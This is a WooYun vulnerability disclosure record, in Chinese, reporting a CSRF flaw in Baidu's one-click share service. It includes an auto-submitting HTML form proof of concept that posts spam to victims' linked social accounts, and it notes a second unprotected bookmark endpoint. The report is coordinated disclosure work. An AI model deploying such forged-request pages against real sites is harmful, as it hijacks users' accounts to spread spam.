{"id": 12404, "wybug_id": "wooyun-2013-022323", "wybug_title": "百度一键分享CSRF", "wybug_corp": "百度", "wybug_author": "小点兵", "wybug_date": "2013-04-23 10:33", "wybug_open_date": "2013-06-07 10:34", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["应用配置错误", "利用技巧", "绕过", "类型应用", "漏洞利用", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-05-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-07：\t细节向公众公开  简要描述： 通过百度账号在绑定关联的其他社交网站上发微博或帖子（包括新浪微博，腾讯微博，人人网，QQ空间以及开心网).可利用此漏洞在多个社交网站上传播social spam. 这个CSRF比较有趣是因为他本身并不攻击存在缺陷的站点，而是隔山打牛，攻击那些信任存在缺陷站点的其他站点。 详细说明：  未做CSRF保护的post入口是http://s.share.baidu.com/mshare构造如下代码：\n<form name=\"form1\" action=\"http://s.share.baidu.com/mshare\" method=\"POST\"><input type=\"hidden\" name=\"url\" value=\"http://any.com\"><input type=\"hidden\" name=\"uid\" value=\"any number\"><input type=\"hidden\" name=\"type\" value=\"text\"><input type=\"hidden\" name=\"site\" value=\"\"><input type=\"hidden\" name=\"title\" value=\"any value\"><input type=\"hidden\" name=\"sign\" value=\"on\"><input type=\"hidden\" name=\"desc\" value=\"\"><input type=\"hidden\" name=\"comment\" value=\"\"><input type=\"hidden\" name=\"searchPic\" value=\"0\"><input type=\"hidden\" name=\"relatedUid\" value=\"\"><input type=\"hidden\" name=\"turl\" value=\"\"><input type=\"hidden\" name=\"buttonType\" value=\"\"><input type=\"hidden\" name=\"apiType\" value=\"\"><input type=\"hidden\" name=\"l\" value=\"any value\"><input type=\"hidden\" name=\"linkid\" value=\"any value\"><input type=\"hidden\" name=\"sloc\" value=\"any value\"><input type=\"hidden\" name=\"token\" value=\"\"><input type=\"hidden\" name=\"content\" value=\"CSRF Test\"><input type=\"hidden\" name=\"pic\" value=\"\"><input type=\"hidden\" name=\"bindList\" value=\"\"><input type=\"hidden\" name=\"to\" value=\"tsina,renren,qzone,tqq,kaixin001,\"></form><script language=\"javascript\">document.form1.submit()</script>\n写入某attack.html文件并存放在攻击者控制的机器上，然后通过<img> <iframe> 等标签散布出去。用户一旦点击，讲被动的在已经和百度关联的其他社交网站上发帖子。   漏洞证明：  在百度账号与新浪微博关联的情况下做实验（关联其他如腾讯微博，人人网，QQ空间以及开心网类似，故不一一列举）攻击前新浪微博：\n\n攻击执行（真是攻击中不可见，这里为了说明方便）：\n\n攻击后新浪微博：\n\n   修复方案：  CSRF一般性防御。比较值得一提的是，我发现提交表单中有token一项，但是没有用。为什么？还在测试阶段？？？另外还有一处CSRF点，在百度收藏中。具体的post口在http://cang.baidu.com/do/cm 可以通过这个CSRF让百度用户收藏恶意站点。但是具体如何扩大攻击，没有具体想法，故不另开一个漏洞提交了。   版权声明：转载请注明来源 小点兵@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-04-23 14:28 厂商回复： 感谢提交，正在安排处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-28 00:36 |    \t\tBlack Angel \t\t\t( 普通白帽子  |\t\t\t        Rank:163 漏洞数:35        | 最神奇的一群人，智慧低调又内敛，俗称马甲...)\t\t \n  前排沙发围观.    \n     2013-05-23 15:38 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:208        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  思路很巧妙    \n     2013-05-24 11:04 |    \t\tmrwang \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 不是在做梦吧，成为白帽子了？吭！注意形象...)\t\t \n  图片是不是看不了？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}